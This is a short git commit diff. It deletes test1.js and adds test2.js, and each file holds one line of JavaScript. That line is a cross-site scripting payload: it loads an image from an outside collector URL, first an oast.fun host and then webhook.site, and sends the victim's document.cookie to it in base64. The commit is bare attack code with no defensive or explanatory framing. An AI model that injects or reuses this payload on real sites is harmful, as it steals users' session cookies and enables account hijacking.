623b411d3199b3b904b45eb156e54c63a6a22d0e
BanVanCuongg <67701860+0x0ff1337@users.noreply.github.com>
2026-03-03 23:52:40 +0700

    Add test2.js file

--- test1.js
+++
@@ -1,1 +0,0 @@
-x = new Image(); x.src = 'https://jautyjbtkuzbqhngpomiui2e3yk84iann.oast.fun?data='+btoa(document.cookie);
---
+++ test2.js
@@ -0,0 +1,1 @@
+x = new Image(); x.src = 'https://webhook.site/eea29ee0-8b18-4750-a767-ed577b5757de?data='+btoa(document.cookie);
